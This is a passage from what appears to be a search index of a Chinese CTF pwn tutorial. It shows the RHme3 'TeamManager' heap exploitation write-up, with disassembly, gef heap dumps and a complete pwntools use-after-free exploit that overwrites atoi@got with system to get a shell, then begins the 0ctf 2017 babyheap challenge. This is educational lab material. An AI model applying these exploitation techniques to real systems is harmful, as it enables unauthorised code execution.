\n|       |   0x004020dc      e89febffff     call sym.imp.puts           ; int puts(const char *s)\n|       |   0x004020e1      488b05781020.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|       |   0x004020e8      4889c7         mov rdi, rax\n|       |   0x004020eb      e8d0ecffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|      ,==  0x004020f0      eb0f           jmp 0x402101\n|      ||      ; JMP XREF from 0x004020d5 (sym.show_player)\n|      |`-  0x004020f2      488b05771020.  mov rax, qword [obj.selected] ; [0x603170:8]=0 ; \u53d6\u51fa\u9009\u4e2d\u7403\u5458\u7684\u5730\u5740\n|      |    0x004020f9      4889c7         mov rdi, rax                 ; \u7403\u5458\u5730\u5740 rax -  rdi\n|      |    0x004020fc      e88af6ffff     call sym.show_player_func    ; \u8c03\u7528\u51fd\u6570 sym.show_player_func \u6253\u5370\u51fa\u7403\u5458\u4fe1\u606f\n|      |       ; JMP XREF from 0x004020f0 (sym.show_player)\n|      `--  0x00402101      488b45f8       mov rax, qword [local_8h]\n|           0x00402105      644833042528.  xor rax, qword fs:[0x28]\n|       ,=  0x0040210e      7405           je 0x402115\n|       |   0x00402110      e8abebffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)\n|       |      ; JMP XREF from 0x0040210e (sym.show_player)\n|       `-  0x00402115      c9             leave\n\\           0x00402116      c3             ret \n\u5728\u8be5\u51fd\u6570\u4e2d\uff0c\u4e5f\u672a\u68c0\u67e5\u9009\u4e2d\u7403\u5458\u662f\u5426\u8fd8\u5b58\u5728\uff0c\u8fd9\u5c31\u5bfc\u81f4\u4e86\u4fe1\u606f\u6cc4\u9732\u3002  \u51fd\u6570  sym.edit_player  \u53ef\u4ee5\u8c03\u7528\u51fd\u6570  sym.set_name  \u4fee\u6539 player name\uff0c\u4f46\u5176\u4e5f\u4e0d\u4f1a\u5bf9 selected \u7684\u503c\u505a\u68c0\u67e5\uff0c\u914d\u5408\u4e0a\u4fe1\u606f\u6cc4\u9732\uff0c\u53ef\u4ee5\u5bfc\u81f4\u4efb\u610f\u5730\u5740\u5199\u3002 [0x00400ec0]  pdf @ sym.set_name\n/ (fcn) sym.set_name 281                                                                                                                                                              \n|   sym.set_name ();\n|           ; var int local_128h @ rbp-0x128\n|           ; var int local_120h @ rbp-0x120\n|           ; var int local_18h @ rbp-0x18\n|              ; CALL XREF from 0x00402058 (sym.edit_player + 101)\n|           0x00401cdb      55             push rbp\n|           0x00401cdc      4889e5         mov rbp, rsp\n|           0x00401cdf      53             push rbx\n|           0x00401ce0      4881ec280100.  sub rsp, 0x128\n|           0x00401ce7      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=-1 ;  (  ; 40\n|           0x00401cf0      488945e8       mov qword [local_18h], rax\n|           0x00401cf4      31c0           xor eax, eax\n|           0x00401cf6      bf69254000     mov edi, str.Enter_new_name: ; 0x402569 ;  Enter new name:  \n|           0x00401cfb      b800000000     mov eax, 0\n|           0x00401d00      e8fbefffff     call sym.imp.printf         ; int printf(const char *format)\n|           0x00401d05      488b05541420.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|           0x00401d0c      4889c7         mov rdi, rax\n|           0x00401d0f      e8acf0ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|           0x00401d14      488d85e0feff.  lea rax, rbp - 0x120\n|           0x00401d1b      be00010000     mov esi, 0x100              ; 256\n|           0x00401d20      4889c7         mov rdi, rax\n|           0x00401d23      e89bf7ffff     call sym.readline            ; \u8bfb\u5165\u4fee\u6539\u7684\u5b57\u7b26\u4e32\uff0c\u5373 system \u7684\u5730\u5740\n|           0x00401d28      488d85e0feff.  lea rax, rbp - 0x120\n|           0x00401d2f      4889c7         mov rdi, rax\n|           0x00401d32      e869efffff     call sym.imp.strlen         ; size_t strlen(const char *s)\n|           0x00401d37      4889c3         mov rbx, rax\n|           0x00401d3a      488b052f1420.  mov rax, qword [obj.selected] ; [0x603170:8]=0\n|           0x00401d41      488b4010       mov rax, qword [rax + 0x10] ; [0x10:8]=-1 ; 16\n|           0x00401d45      4889c7         mov rdi, rax\n|           0x00401d48      e853efffff     call sym.imp.strlen         ; size_t strlen(const char *s)\n|           0x00401d4d      4839c3         cmp rbx, rax\n|       ,=  0x00401d50      7667           jbe 0x401db9                 ; rab == rax\uff0c\u6210\u529f\u8df3\u8f6c\n|       |   0x00401d52      488d85e0feff.  lea rax, rbp - 0x120\n|       |   0x00401d59      4889c7         mov rdi, rax\n|       |   0x00401d5c      e83fefffff     call sym.imp.strlen         ; size_t strlen(const char *s)\n|       |   0x00401d61      488d5001       lea rdx, rax + 1            ; 1\n|       |   0x00401d65      488b05041420.  mov rax, qword [obj.selected] ; [0x603170:8]=0\n|       |   0x00401d6c      488b4010       mov rax, qword [rax + 0x10] ; [0x10:8]=-1 ; 16\n|       |   0x00401d70      4889d6         mov rsi, rdx\n|       |   0x00401d73      4889c7         mov rdi, rax\n|       |   0x00401d76      e865f0ffff     call sym.imp.realloc        ; void *realloc(void *ptr, size_t size)\n|       |   0x00401d7b      488985d8feff.  mov qword [local_128h], rax\n|       |   0x00401d82      4883bdd8feff.  cmp qword [local_128h], 0\n|      ,==  0x00401d8a      751b           jne 0x401da7\n|      ||   0x00401d8c      bf7a254000     mov edi, str.Could_not_realloc_: ; 0x40257a ;  Could not realloc :( \n|      ||   0x00401d91      e8eaeeffff     call sym.imp.puts           ; int puts(const char *s)\n|      ||   0x00401d96      488b05c31320.  mov rax, qword [obj.stdout] ; [0x603160:8]=0\n|      ||   0x00401d9d      4889c7         mov rdi, rax\n|      ||   0x00401da0      e81bf0ffff     call sym.imp.fflush         ; int fflush(FILE *stream)\n|     ,===  0x00401da5      eb2f           jmp 0x401dd6\n|     |||      ; JMP XREF from 0x00401d8a (sym.set_name)\n|     |`--  0x00401da7      488b05c21320.  mov rax, qword [obj.selected] ; [0x603170:8]=0\n|     | |   0x00401dae      488b95d8feff.  mov rdx, qword [local_128h]\n|     | |   0x00401db5      48895010       mov qword [rax + 0x10], rdx\n|     | |      ; JMP XREF from 0x00401d50 (sym.set_name)\n|     | `-  0x00401db9      488b05b01320.  mov rax, qword [obj.selected] ; [0x603170:8]=0 ; \u53d6\u51fa\u9009\u4e2d\u7403\u5458\u7684\u5730\u5740\n|     |     0x00401dc0      488b4010       mov rax, qword [rax + 0x10] ; [0x10:8]=-1 ; 16 ; player.name \u5b57\u6bb5\uff0c\u5373 atoi@got\n|     |     0x00401dc4      488d95e0feff.  lea rdx, rbp - 0x120         ; system@got\n|     |     0x00401dcb      4889d6         mov rsi, rdx                 ; rsi  - rdx\n|     |     0x00401dce      4889c7         mov rdi, rax                 ; rdi  - rax\n|     |     0x00401dd1      e89aeeffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src) ; \u7528 system \u7684\u5730\u5740\u8986\u76d6 atoi \u7684\u5730\u5740\n|     |        ; JMP XREF from 0x00401da5 (sym.set_name)\n|     `---  0x00401dd6      488b45e8       mov rax, qword [local_18h]\n|           0x00401dda      644833042528.  xor rax, qword fs:[0x28]\n|       ,=  0x00401de3      7405           je 0x401dea\n|       |   0x00401de5      e8d6eeffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)\n|       |      ; JMP XREF from 0x00401de3 (sym.set_name)\n|       `-  0x00401dea      4881c4280100.  add rsp, 0x128\n|           0x00401df1      5b             pop rbx\n|           0x00401df2      5d             pop rbp\n\\           0x00401df3      c3             ret", 
            "title": "\u9759\u6001\u5206\u6790"
        }, 
        {
            "location": "/pwn/lab/6.1.9_rhme3_exploitation/#_4", 
            "text": "\u6f0f\u6d1e\u5927\u6982\u6e05\u695a\u4e86\uff0c\u6211\u4eec\u4f7f\u7528 gdb \u52a8\u6001\u8c03\u8bd5\u4e00\u4e0b\uff0c\u4e3a\u4e86\u65b9\u4fbf\u5206\u6790\uff0c\u5148\u5173\u95ed ASRL\u3002gef \u6709\u4e2a\u5f88\u5f3a\u5927\u7684\u547d\u4ee4  heap-analysis-helper \uff0c\u53ef\u4ee5\u8ffd\u8e2a  malloc() \u3001 free() \u3001 realloc()  \u7b49\u51fd\u6570\u7684\u8c03\u7528\uff1a gef\u27a4  heap-analysis-helper\n[*] This feature is under development, expect bugs and unstability...\n[+] Tracking malloc()\n[+] Tracking free()\n[+] Tracking realloc()\n[+] Disabling hardware watchpoints (this may increase the latency)\n[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.\n[*] Note: The heap analysis slows down noticeably the execution.\ngef\u27a4  c\nContinuing.\nWelcome to your TeamManager (TM)!\n0.- Exit\n1.- Add player\n2.- Remove player\n3.- Select player\n4.- Edit player\n5.- Show player\n6.- Show team\nYour choice: 1   \nFound free slot: 0\n[+] Heap-Analysis - malloc(24)=0x604010\nEnter player name: aaaa\n[+] Heap-Analysis - malloc(5)=0x604030\nEnter attack points: 1\nEnter defense points: 2\nEnter speed: 3\nEnter precision: 4\n0.- Exit\n1.- Add player\n2.- Remove player\n3.- Select player\n4.- Edit player\n5.- Show player\n6.- Show team\nYour choice: 2\nEnter index: 0\n[+] Heap-Analysis - free(0x604030)\n[+] Heap-Analysis - watching 0x604030\n[+] Heap-Analysis - free(0x604010)\n[+] Heap-Analysis - watching 0x604010\nShe s gone! \n\u5f88\u597d\u5730\u9a8c\u8bc1\u4e86\u7403\u5458\u5206\u914d\u548c\u5220\u9664\u7684\u8fc7\u7a0b\u3002", 
            "title": "\u52a8\u6001\u5206\u6790"
        }, 
        {
            "location": "/pwn/lab/6.1.9_rhme3_exploitation/#alloc-and-select", 
            "text": "\u7136\u540e\u662f\u5185\u5b58\uff0c\u6839\u636e\u6211\u4eec\u5bf9\u5806\u7ba1\u7406\u673a\u5236\u7684\u7406\u89e3\uff0c\u8fd9\u91cc\u9009\u62e9\u4f7f\u7528 small chunk\uff08\u7403\u5458 name chunk\uff09\uff1a alloc ( A   *   0x60 )  alloc ( B   *   0x80 )  alloc ( C   *   0x80 )  select ( 1 )   gef\u27a4  x/4gx 0x603180\n0x603180  players : 0x0000000000604010  0x00000000006040a0\n0x603190  players+16 :  0x0000000000604150  0x0000000000000000\ngef\u27a4  x/70gx 0x604010-0x10\n0x604000:   0x0000000000000000  0x0000000000000021  -- player 0  -- actual player chunk\n0x604010:   0x0000000200000001  0x0000000400000003               -- pointer returned by malloc\n0x604020:   0x0000000000604030  0x0000000000000071  -- name 0    -- player s name chunk\n0x604030:   0x4141414141414141  0x4141414141414141\n0x604040:   0x4141414141414141  0x4141414141414141\n0x604050:   0x4141414141414141  0x4141414141414141\n0x604060:   0x4141414141414141  0x4141414141414141\n0x604070:   0x4141414141414141  0x4141414141414141\n0x604080:   0x4141414141414141  0x4141414141414141\n0x604090:   0x0000000000000000  0x0000000000000021  -- player 1\n0x6040a0:   0x0000000200000001  0x0000000400000003               -- selected\n0x6040b0:   0x00000000006040c0  0x0000000000000091  -- name 1\n0x6040c0:   0x4242424242424242  0x4242424242424242\n0x6040d0:   0x4242424242424242  0x4242424242424242\n0x6040e0:   0x4242424242424242  0x4242424242424242\n0x6040f0:   0x4242424242424242  0x4242424242424242\n0x604100:   0x4242424242424242  0x4242424242424242\n0x604110:   0x4242424242424242  0x4242424242424242\n0x604120:   0x4242424242424242  0x4242424242424242\n0x604130:   0x4242424242424242  0x4242424242424242\n0x604140:   0x0000000000000000  0x0000000000000021  -- player 2\n0x604150:   0x0000000200000001  0x0000000400000003\n0x604160:   0x0000000000604170  0x0000000000000091  -- name 2\n0x604170:   0x4343434343434343  0x4343434343434343\n0x604180:   0x4343434343434343  0x4343434343434343\n0x604190:   0x4343434343434343  0x4343434343434343\n0x6041a0:   0x4343434343434343  0x4343434343434343\n0x6041b0:   0x4343434343434343  0x4343434343434343\n0x6041c0:   0x4343434343434343  0x4343434343434343\n0x6041d0:   0x4343434343434343  0x4343434343434343\n0x6041e0:   0x4343434343434343  0x4343434343434343\n0x6041f0:   0x0000000000000000  0x0000000000020e11               -- top chunk\n0x604200:   0x0000000000000000  0x0000000000000000\n0x604210:   0x0000000000000000  0x0000000000000000\n0x604220:   0x0000000000000000  0x0000000000000000\ngef\u27a4  p selected\n$2 = 0x6040a0", 
            "title": "alloc and select"
        }, 
        {
            "location": "/pwn/lab/6.1.9_rhme3_exploitation/#free", 
            "text": "\u7136\u540e\uff1a free ( 1 )   gef\u27a4  x/4gx 0x603180\n0x603180  players : 0x0000000000604010  0x0000000000000000  -- set zero\n0x603190  players+16 :  0x0000000000604150  0x0000000000000000\ngef\u27a4  x/70gx 0x604010-0x10\n0x604000:   0x0000000000000000  0x0000000000000021  -- player 0\n0x604010:   0x0000000200000001  0x0000000400000003\n0x604020:   0x0000000000604030  0x0000000000000071  -- name 0\n0x604030:   0x4141414141414141  0x4141414141414141\n0x604040:   0x4141414141414141  0x4141414141414141\n0x604050:   0x4141414141414141  0x4141414141414141\n0x604060:   0x4141414141414141  0x4141414141414141\n0x604070:   0x4141414141414141  0x4141414141414141\n0x604080:   0x4141414141414141  0x4141414141414141\n0x604090:   0x0000000000000000  0x0000000000000021  -- player 1 [be freed]  -- fastbins\n0x6040a0:   0x0000000000000000  0x0000000400000003               -- selected\n0x6040b0:   0x00000000006040c0  0x0000000000000091  -- name 1 [be freed]  -- unsorted_bin\n0x6040c0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78               -- fd | bk\n0x6040d0:   0x4242424242424242  0x4242424242424242\n0x6040e0:   0x4242424242424242  0x4242424242424242\n0x6040f0:   0x4242424242424242  0x4242424242424242\n0x604100:   0x4242424242424242  0x4242424242424242\n0x604110:   0x4242424242424242  0x4242424242424242\n0x604120:   0x4242424242424242  0x4242424242424242\n0x604130:   0x4242424242424242  0x4242424242424242\n0x604140:   0x0000000000000090  0x0000000000000020  -- player 2\n0x604150:   0x0000000200000001  0x0000000400000003\n0x604160:   0x0000000000604170  0x0000000000000091  -- name 2\n0x604170:   0x4343434343434343  0x4343434343434343\n0x604180:   0x4343434343434343  0x4343434343434343\n0x604190:   0x4343434343434343  0x4343434343434343\n0x6041a0:   0x4343434343434343  0x4343434343434343\n0x6041b0:   0x4343434343434343  0x4343434343434343\n0x6041c0:   0x4343434343434343  0x4343434343434343\n0x6041d0:   0x4343434343434343  0x4343434343434343\n0x6041e0:   0x4343434343434343  0x4343434343434343\n0x6041f0:   0x0000000000000000  0x0000000000020e11               -- top chunk\n0x604200:   0x0000000000000000  0x0000000000000000\n0x604210:   0x0000000000000000  0x0000000000000000\n0x604220:   0x0000000000000000  0x0000000000000000\ngef\u27a4  p selected\n$3 = 0x6040a0\ngef\u27a4  heap bins\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x6040a0, size=0x20, flags=PREV_INUSE)\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena  main_arena  ]\n[+] unsorted_bins[0]: fw=0x6040b0, bk=0x6040b0\n \u2192   Chunk(addr=0x6040c0, size=0x90, flags=PREV_INUSE) \n\u6211\u4eec\u77e5\u9053\uff0c\u5f53\u4e00\u4e2a small chunk \u88ab\u91ca\u653e\u540e\uff0c\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\uff0c\u8fd9\u662f\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff0c\u5b83\u7684 fd \u6307\u9488\u6307\u5411\u4e86\u94fe\u8868\u7684\u5934\u90e8\uff0c\u5373\u5730\u5740  0x00007ffff7dd1b78 \u3002\u7136\u540e\u4f7f\u7528\u547d\u4ee4  vmmap  \u83b7\u5f97 libc \u88ab\u52a0\u8f7d\u7684\u5730\u5740\uff0c\u7528\u94fe\u8868\u5934\u90e8\u5730\u5740\u51cf\u6389\u5b83\uff0c\u5f97\u5230\u504f\u79fb\u3002\u5f53\u5f00\u542f ASLR \u540e\uff0c\u5176\u5730\u5740\u4f1a\u53d8\uff0c\u4f46\u504f\u79fb\u4e0d\u53d8\u3002\u540c\u65f6\uff0c\u91ca\u653e\u7684 player 1 chunk \u88ab\u52a0\u5165\u5230 fastbins \u5355\u94fe\u8868\u4e2d\u3002 [0x00400ec0]  ?v 0x00007ffff7dd1b78 - 0x00007ffff7a0d000\n0x3c4b78  \u518d\u6b21 free\uff0c\u5c06 player 2 \u91ca\u653e\uff0c\u56e0\u4e3a player 1 \u4e5f\u662f\u88ab\u91ca\u653e\u7684\u72b6\u6001\uff0c\u6240\u4ee5\u4e24\u4e2a chunk \u4f1a\u88ab\u5408\u5e76\uff08\u5176\u5b9e player \u662f fast chunk\uff0c\u4e0d\u4f1a\u88ab\u5408\u5e76\uff0c\u771f\u6b63\u5408\u5e76\u7684\u662f name chunk\uff09\uff1a free ( 2 )   gef\u27a4  x/4gx 0x603180\n0x603180  players : 0x0000000000604010  0x0000000000000000\n0x603190  players+16 :  0x0000000000000000  0x0000000000000000\ngef\u27a4  x/70gx 0x604010-0x10\n0x604000:   0x0000000000000000  0x0000000000000021  -- player 0\n0x604010:   0x0000000200000001  0x0000000400000003\n0x604020:   0x0000000000604030  0x0000000000000071  -- name 0\n0x604030:   0x4141414141414141  0x4141414141414141\n0x604040:   0x4141414141414141  0x4141414141414141\n0x604050:   0x4141414141414141  0x4141414141414141\n0x604060:   0x4141414141414141  0x4141414141414141\n0x604070:   0x4141414141414141  0x4141414141414141\n0x604080:   0x4141414141414141  0x4141414141414141\n0x604090:   0x0000000000000000  0x00000000000000b1  -- player 1 [be freed]  -- unsorted_bin\n0x6040a0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78               -- selected\n0x6040b0:   0x00000000006040c0  0x0000000000000091  -- player 2 [be freed]\n0x6040c0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x6040d0:   0x4242424242424242  0x4242424242424242\n0x6040e0:   0x4242424242424242  0x4242424242424242\n0x6040f0:   0x4242424242424242  0x4242424242424242\n0x604100:   0x4242424242424242  0x4242424242424242\n0x604110:   0x4242424242424242  0x4242424242424242\n0x604120:   0x4242424242424242  0x4242424242424242\n0x604130:   0x4242424242424242  0x4242424242424242\n0x604140:   0x00000000000000b0  0x0000000000000020               -- fastbins\n0x604150:   0x0000000000000000  0x0000000400000003\n0x604160:   0x0000000000604170  0x0000000000020ea1\n0x604170:   0x4343434343434343  0x4343434343434343\n0x604180:   0x4343434343434343  0x4343434343434343\n0x604190:   0x4343434343434343  0x4343434343434343\n0x6041a0:   0x4343434343434343  0x4343434343434343\n0x6041b0:   0x4343434343434343  0x4343434343434343\n0x6041c0:   0x4343434343434343  0x4343434343434343\n0x6041d0:   0x4343434343434343  0x4343434343434343\n0x6041e0:   0x4343434343434343  0x4343434343434343\n0x6041f0:   0x0000000000000000  0x0000000000020e11               -- top chunk\n0x604200:   0x0000000000000000  0x0000000000000000\n0x604210:   0x0000000000000000  0x0000000000000000\n0x604220:   0x0000000000000000  0x0000000000000000\ngef\u27a4  p selected\n$4 = 0x6040a0\ngef\u27a4  heap bins fast\n[ Fastbins for arena 0x7ffff7dd1b20 ]\nFastbins[idx=0, size=0x10]  \u2190  Chunk(addr=0x604150, size=0x20, flags=)\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena  main_arena  ]\n[+] unsorted_bins[0]: fw=0x604090, bk=0x604090\n \u2192   Chunk(addr=0x6040a0, size=0xb0, flags=PREV_INUSE)", 
            "title": "free"
        }, 
        {
            "location": "/pwn/lab/6.1.9_rhme3_exploitation/#alloc-again", 
            "text": "\u6dfb\u52a0\u4e00\u4e2a\u7403\u5458\uff0cplayer chunk \u5c06\u4ece fastbins \u94fe\u8868\u4e2d\u53d6\u51fa\uff0c\u800c name chunk \u5c06\u4ece unsorted_bin \u4e2d\u53d6\u51fa\uff1a alloc ( D * 16   +   p64 ( atoi_got ))   gef\u27a4  x/4gx 0x603180\n0x603180  players : 0x0000000000604010  0x0000000000604150\n0x603190  players+16 :  0x0000000000000000  0x0000000000000000\ngef\u27a4  x/70gx 0x604010-0x10\n0x604000:   0x0000000000000000  0x0000000000000021  -- player 0\n0x604010:   0x0000000200000001  0x0000000400000003\n0x604020:   0x0000000000604030  0x0000000000000071  -- name 0\n0x604030:   0x4141414141414141  0x4141414141414141\n0x604040:   0x4141414141414141  0x4141414141414141\n0x604050:   0x4141414141414141  0x4141414141414141\n0x604060:   0x4141414141414141  0x4141414141414141\n0x604070:   0x4141414141414141  0x4141414141414141\n0x604080:   0x4141414141414141  0x4141414141414141\n0x604090:   0x0000000000000000  0x0000000000000021  -- name 3\n0x6040a0:   0x4444444444444444  0x4444444444444444               -- selected\n0x6040b0:   0x0000000000603110  0x0000000000000091               -- unsorted_bin\n0x6040c0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x6040d0:   0x4242424242424242  0x4242424242424242\n0x6040e0:   0x4242424242424242  0x4242424242424242\n0x6040f0:   0x4242424242424242  0x4242424242424242\n0x604100:   0x4242424242424242  0x4242424242424242\n0x604110:   0x4242424242424242  0x4242424242424242\n0x604120:   0x4242424242424242  0x4242424242424242\n0x604130:   0x4242424242424242  0x4242424242424242\n0x604140:   0x0000000000000090  0x0000000000000020  -- player 3\n0x604150:   0x0000000200000001  0x0000000400000003\n0x604160:   0x00000000006040a0  0x0000000000020ea1\n0x604170:   0x4343434343434343  0x4343434343434343\n0x604180:   0x4343434343434343  0x4343434343434343\n0x604190:   0x4343434343434343  0x4343434343434343\n0x6041a0:   0x4343434343434343  0x4343434343434343\n0x6041b0:   0x4343434343434343  0x4343434343434343\n0x6041c0:   0x4343434343434343  0x4343434343434343\n0x6041d0:   0x4343434343434343  0x4343434343434343\n0x6041e0:   0x4343434343434343  0x4343434343434343\n0x6041f0:   0x0000000000000000  0x0000000000020e11               -- top chunk\n0x604200:   0x0000000000000000  0x0000000000000000\n0x604210:   0x0000000000000000  0x0000000000000000\n0x604220:   0x0000000000000000  0x0000000000000000\ngef\u27a4  p selected\n$5 = 0x6040a0\ngef\u27a4  heap bins unsorted\n[ Unsorted Bin for arena  main_arena  ]\n[+] unsorted_bins[0]: fw=0x6040b0, bk=0x6040b0\n \u2192   Chunk(addr=0x6040c0, size=0x90, flags=PREV_INUSE)", 
            "title": "alloc again"
        }, 
        {
            "location": "/pwn/lab/6.1.9_rhme3_exploitation/#edit-and-get-shell", 
            "text": "\u7f16\u8f91 selected \u5904\u7684 chunck\uff0c\u5373 name 3\uff1a # atoi@got -  system@got  edit ( p64 ( system ))  # get shell  p . recvuntil ( choice:  )  p . sendline ( sh )  \n\u51fd\u6570 atoi@got \u5df2\u7ecf\u88ab\u6211\u4eec\u8986\u76d6\u4e3a system@got\uff0c\u5f53\u8c03\u7528 atoi \u65f6\uff0c\u5b9e\u9645\u4e0a\u662f\u6267\u884c\u4e86 system('sh')\uff1a gef\u27a4  p atoi\n$2 = {int (const char *)} 0x7ffff7a43e80  atoi \ngef\u27a4  x/gx 0x603110\n0x603110:   0x00007ffff7a52390  \u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u91cd\u65b0\u542f\u7528 ASLR \u4e86\uff0c\u8be5\u4fdd\u62a4\u673a\u5236\u5df2\u7ecf\u88ab\u7ed5\u8fc7\u3002  Bingo!!! $ python exp.py\n[+] Opening connection to 127.0.0.1 on port 10001: Done\n[*] leak   =  0x7fcd41824b78\n[*] libc   =  0x7fcd41460000\n[*] system =  0x7fcd414a5390\n[*] Switching to interactive mode\n$ whoami\nfirmy", 
            "title": "edit and get shell"
        }, 
        {
            "location": "/pwn/lab/6.1.9_rhme3_exploitation/#exploit", 
            "text": "\u5b8c\u6574\u7684 exp \u5982\u4e0b\uff1a from   pwn   import   *  # context.log_level =  debug  p   =   remote ( 127.0.0.1 ,   10001 )  # p = process( ./main.elf )  def   alloc ( name ,   attack   =   1 ,   defense   =   2 ,   speed   =   3 ,   precision   =   4 ): \n     p . recvuntil ( choice:  ) \n     p . sendline ( 1 ) \n     p . recvuntil ( name:  ) \n     p . sendline ( name ) \n     p . recvuntil ( points:  ) \n     p . sendline ( str ( attack )) \n     p . recvuntil ( points:  ) \n     p . sendline ( str ( defense )) \n     p . recvuntil ( speed:  ) \n     p . sendline ( str ( speed )) \n     p . recvuntil ( precision:  ) \n     p . sendline ( str ( precision ))  def   free ( idx ): \n     p . recvuntil ( choice:  ) \n     p . sendline ( 2 ) \n     p . recvuntil ( index:  ) \n     p . sendline ( str ( idx ))  def   select ( idx ): \n     p . recvuntil ( choice:  ) \n     p . sendline ( 3 ) \n     p . recvuntil ( index:  ) \n     p . sendline ( str ( idx ))  def   edit ( name ): \n     p . recvuntil ( choice:  ) \n     p . sendline ( 4 ) \n     p . recvuntil ( choice:  ) \n     p . sendline ( 1 ) \n     p . recvuntil ( name:  ) \n     p . sendline ( name )  def   show (): \n     p . recvuntil ( choice:  ) \n     p . sendline ( 5 )  # gdb.attach(p,   # b *0x00402205  # c  #  )  atoi_got   =   0x603110  alloc ( A   *   0x60 )  alloc ( B   *   0x80 )  alloc ( C   *   0x80 )  select ( 1 )  free ( 1 )  show ()  p . recvuntil ( Name:  )  leak      =   u64 ( p . recv ( 6 ) . ljust ( 8 ,   \\x00 ))  libc      =   leak   -   0x3c4b78     # 0x3c4b78 = leak - libc  system    =   libc   +   0x045390     # $ readelf -s libc.so.6 | grep system@  log . info ( leak   =  0x %x   %   leak )  log . info ( libc   =  0x %x   %   libc )  log . info ( system =  0x %x   %   system )  free ( 2 )  alloc ( D * 16   +   p64 ( atoi_got ))  # atoi@got -  system@got  edit ( p64 ( system ))  # get shell  p . recvuntil ( choice:  )  p . sendline ( sh )  p . interactive ()", 
            "title": "Exploit"
        }, 
        {
            "location": "/pwn/lab/6.1.9_rhme3_exploitation/#_5", 
            "text": "Exploitation", 
            "title": "\u53c2\u8003\u8d44\u6599"
        }, 
        {
            "location": "/pwn/lab/6.1.10_0ctf2017_babyheap2017/", 
            "text": "\u9898\u76ee\u590d\u73b0\n\n\n\u9898\u76ee\u89e3\u6790\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\n\u4e0b\u8f7d\u6587\u4ef6\n\n\n\u9898\u76ee\u590d\u73b0\n\n\n\u8fd9\u4e2a\u9898\u76ee\u7ed9\u51fa\u4e86\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u5728 Ubuntu 16.04 \u4e0a\uff0clibc \u5c31\u7528\u81ea\u5e26\u7684\u3002\n\n$ file babyheap\nbabyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped\n$ checksec -f babyheap\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY   Fortified Fortifiable  FILE\nFull RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   Yes       0               2       babyheap\n$ file /lib/x86_64-linux-gnu/libc-2.23.so\n/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped\n\n\n64 \u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5168\u5f00\u3002\n\n\n\u628a\u5b83\u8fd0\u884c\u8d77\u6765\uff1a\n\nsocat tcp4-listen:10001,reuseaddr,fork exec:./babyheap \n\n\n\n\n\u4e00\u4e2a\u5178\u578b\u7684\u5806\u5229\u7528\u9898\u76ee\uff1a\n\n$ ./babyheap\n===== Baby Heap in 2017 =====\n1. Allocate\n2. Fill\n3. Free\n4. Dump\n5. Exit\nCommand: 1      // \u5206\u914d\u4e00\u4e2a\u6307\u5b9a\u5927\u5c0f\u7684 chunk\nSize: 5\nAllocate Index 0\n1. Allocate\n2. Fill\n3. Free\n4. Dump\n5. Exit\nCommand: 2      // \u5c06\u6307\u5b9a\u5927\u5c0f\u6570\u636e\u653e\u8fdb chunk\uff0c\u4f46\u4f3c\u4e4e\u6ca1\u6709\u8fdb\u884c\u8fb9\u754c\u68c0\u67e5\uff0c\u5bfc\u81f4\u6ea2\u51fa\nIndex: 0\nSize: 10\nContent: aaaaaaaaaa     // 10\u4e2aa\n1. Allocate\n2. Fill\n3. Free\n4. Dump\n5. Exit\nCommand: 1. Allocate    // \u4f3c\u4e4e\u89e6\u53d1\u4e86\u4ec0\u4e48 bug\uff0c\u5982\u679c\u662f9\u4e2aa\u5c31\u6ca1\u4e8b\n2. Fill\n3. Free\n4. Dump\n5. Exit\nCommand: 4      // \u6253\u5370\u51fa chunk \u7684\u5185\u5bb9\uff0c\u957f\u5ea6\u662f\u65b0\u5efa\u65f6\u7684\u957f\u5ea6\uff0c\u800c\u4e0d\u662f\u653e\u5165\u6570\u636e\u7684\u957f\u5ea6\nIndex: 0\nContent:\naaaaa\n1. Allocate\n2. Fill\n3. Free\n4. Dump\n5. Exit\nCommand: 3      // \u91ca\u653e chunk\nIndex: 0\n1. Allocate\n2. Fill\n3. Free\n4. Dump\n5. Exit\nCommand: 5\n\n\n\n\u9898\u76ee\u89e3\u6790\n\n\n\u6839\u636e\u524d\u9762\u6240\u5b66\u7684\u77e5\u8bc6\uff0c\u6211\u4eec\u77e5\u9053\u91ca\u653e\u4e14\u53ea\u91ca\u653e\u4e86\u4e00\u4e2a chunk \u540e\uff0c\u8be5 free chunk \u4f1a\u88ab\u52a0\u5165\u5230 unsorted bin \u4e2d\uff0c\u5b83\u7684 fd/bk \u6307\u9488\u6307\u5411\u4e86 libc \u4e2d\u7684 main_arena 